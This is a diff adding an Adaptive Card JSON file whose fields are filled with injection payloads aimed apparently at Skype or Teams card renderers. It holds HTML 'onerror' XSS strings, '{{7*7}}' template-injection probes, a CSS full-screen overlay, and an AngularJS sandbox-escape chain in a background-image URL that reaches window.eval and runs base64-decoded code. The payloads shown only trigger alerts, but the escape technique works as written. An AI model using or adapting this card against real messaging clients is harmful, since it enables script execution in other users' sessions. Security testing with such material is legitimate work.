@@ -1,0 +1,68 @@
+{
+  "$schema": "https://adaptivecards.io/schemas/adaptive-card.json",
+  "type": "AdaptiveCard",
+  "version": "1.2",
+  "backgroundImage": {
+    "url": "https://pbs.twimg.com/profile_images/3647943215/d7f12830b3c17a5a9e4afcc370e3a37e_400x400.jpeg",
+    "fillMode": "cover"
+  },
+  "speak": "{{ ctrl.xss('xss-ng-speak'); }} <img src=/ onerror=javascript:alert('xss-html-speak')>",
+  "minHeight": "50px; display: block; z-index: 100000; opacity: 0.5; position: fixed; top: 0px; left: 0; width: 1000000px; height: 100000px; background-color: red;",
+  "body": [
+    {
+      "type": "Input.Toggle",
+      "title": "oxox {{7*7}} <img src=/ onerror=javascript:alert('TextBlock')>",
+      "value": "true",
+      "valueOn": "true",
+      "valueOff": "false"
+    },
+    {
+      "type": "Input.ChoiceSet",
+      "id": "{{7*7}} <img src=/ onerror=javascript:alert('TextBlock')>",
+      "style": "expanded",
+      "isMultiSelect": false,
+      "value": "1",
+      "choices": [
+        {
+          "title": "Red {{7*7}} <img src=/ onerror=javascript:alert('TextBlock')>",
+          "value": "1-{{7*7}} <img src=/ onerror=javascript:alert('TextBlock')>"
+        },
+        {
+          "title": "2nd",
+          "value": "2"
+        }
+      ]
+    },
+    {
+      "type": "RichTextBlock",
+      "inlines": [
+        "This is the first **inline**. {{7*7}} <img src=/ onerror=javascript:alert('TextBlock')>",
+        {
+          "type": "TextRun",
+          "text": "We support **colors**, {{7*7}} <img src=/ onerror=javascript:alert('TextBlock')>",
+          "color": "good"
+        }
+      ]
+    },
+    {
+      "type": "TextBlock",
+      "text": "TextBlock {{7*7}} <img src=/ onerror=javascript:alert('TextBlock')>"
+    },
+    {
+      "type": "Container",
+      "backgroundImage": "https://urlp.asm.skype.com/v1/url/content?aaa=xxx{{[\\27if(!window.__x__){eval(atob(decodeURIComponent(/YWxlcnQoKQ/.source))),window.__x__=1}\\27].forEach($root.$$childHead.$$nextSibling.app.$window.eval)}}&url=https://test.com/",
+      "items": [
+        {
+          "type": "TextBlock",
+          "text": "TextBlock {{7*7}} <img src=/ onerror=javascript:alert('TextBlock')>"
+        }
+      ]
+    }
+  ],
+  "actions": [
+    {
+      "type": "Action.Submit",
+      "title": "Submit"
+    }
+  ]
+}
